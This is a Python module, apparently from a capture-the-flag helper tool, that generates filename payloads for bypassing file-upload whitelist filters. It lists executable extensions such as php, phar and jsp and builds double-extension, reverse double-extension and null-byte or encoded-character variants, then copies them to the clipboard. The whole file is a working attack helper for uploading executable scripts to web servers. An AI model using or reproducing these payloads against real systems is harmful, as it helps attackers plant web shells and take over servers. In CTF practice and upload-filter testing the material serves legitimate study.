
IMAGE_EXTENSIONS = [
    "jpg",
    "jpeg",
    "png",
    "gif",
    "webp",
    "bmp",
    "svg",
    "ico",
]

EXECUTABLE_EXTENSIONS = [
    "asp",
    "aspx",
    "bat",
    "cfm",
    "cgi",
    "exe",
    "hta",
    "htm",
    "html",
    "inc",
    "jsp",
    "php",
    "php2",
    "php3",
    "php4",
    "php5",
    "php7",
    "php8",
    "phar",
    "phps",
    "pht",
    "phtml",
    "pl",
    "rb",
    "sh",
]

PHP_EXTENSIONS = [
    "php",
    "php3",
    "php4",
    "php5",
    "php7",
    "php8",
    "phar",
    "phps",
    "pht",
    "phtml",
]

CHARS = [
    "%20",
    "%0a",
    "%00",
    "%0d0a",
    "/",
    ".\\",
    ".",
    "…",
    ":",
]


def copy_to_clipboard(text):
    try:
        import pyperclip
        pyperclip.copy(text)
        return True
    except ImportError:
        print("\n\033[93m[!] Missing dependency: run 'pip install pyperclip' to enable auto-copy.\033[0m")
        return False
    except Exception:
        return False


def run(data, cred, args):

    G = "\033[92m"
    C = "\033[96m"
    B = "\033[94m"
    Y = "\033[93m"
    M = "\033[95m"
    W = "\033[0m"
    BOLD = "\033[1m"


    #
    # Discovery mode
    #
    if not getattr(args, "extra", None):

        payloads = IMAGE_EXTENSIONS + [""] + EXECUTABLE_EXTENSIONS

        print(f"\n{B}┌── {BOLD}UPLOAD: WHITELIST FILTERS{W}{B} ───────────────────────────┐{W}")

        print(f"\n{B}[{W}{Y}*{W}{B}]{W} Common allowed image extensions:\n")

        print(f"{Y}" + "\n".join(IMAGE_EXTENSIONS) + f"{W}")

        print(f"\n{B}[{W}{Y}*{W}{B}]{W} Interesting executable extensions:\n")

        print(f"{Y}" + "\n".join(EXECUTABLE_EXTENSIONS) + f"{W}")

        copy_to_clipboard("\n".join(payloads))

        print(f"\n{B}[{W}{G}+{W}{B}]{W} Payload list copied to clipboard.")

        print(f"\n{B}[{W}{Y}*{W}{B}]{W} Identify which image extension is allowed, then run:")
        print(f"\n    {Y}ctf upload.whitelist jpg{W}\n")

        return

    #
    # Generation mode
    #

    allowed = args.extra[0].lower()

    print(f"\n{B}┌── {BOLD}UPLOAD: WHITELIST BYPASS{W}{B} ────────────────────────────┐{W}")
    print(f"{B}│{W} Allowed Extension : {C}{allowed}{W}")
    print(f"{B}└──────────────────────────────────────────────────────────────┘{W}")

    print(f"""
{Y}[1]{W} Double Extension
{Y}[2]{W} Reverse Double Extension
{Y}[3]{W} Character Injection
{Y}[4]{W} Everything
""")

    choice = input(f"{M}select>{W} ").strip()

    payloads = []

    if choice in ("1", "4"):
        for ext in PHP_EXTENSIONS:
            payloads.append(f"{allowed}.{ext}")

    if choice in ("2", "4"):
        for ext in PHP_EXTENSIONS:
            payloads.append(f"{ext}.{allowed}")

    if choice in ("3", "4"):
        for ext in ["php", "phps", "phtml", "phar"]:
            for char in CHARS:
                payloads.append(f"{ext}{char}.{allowed}")
                payloads.append(f"{char}.{ext}.{allowed}")
                payloads.append(f"{allowed}{char}.{ext}")
                payloads.append(f"{allowed}.{ext}{char}")

    print()

    print(f"{Y}" + "\n".join(payloads) + f"{W}")

    copy_to_clipboard("\n".join(payloads))

    print(f"\n{B}[{W}{G}+{W}{B}]{W} Copied {C}{len(payloads)}{W} payloads to clipboard.\n")
